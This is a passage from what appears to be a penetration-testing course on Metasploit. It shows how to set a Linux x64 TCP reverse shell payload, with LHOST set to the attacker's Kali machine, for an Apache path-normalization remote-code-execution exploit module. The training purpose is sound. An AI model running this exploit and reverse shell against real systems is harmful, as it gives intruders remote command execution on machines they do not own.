> Listing 643 - Display the options for the exploit module

The options shown in Listing 643 are the options available for the auxiliary modules from the previous section. However, for exploit modules, there is an additional section named Payload options. If we don't set this, this module will select a default payload. The default payload may not be what we want or expect, so it's always better to set our options explicitly to maintain control of the exploitation process.

We'll cover different payloads in the next Learning, but for now we need to set it to a TCP reverse shell. We can select a payload with set payload and the payload name, in case payload/linux/x64/shell_reverse_tcp. In addition, we set the IP address of our Kali machine for LHOST.

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload
payload/linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
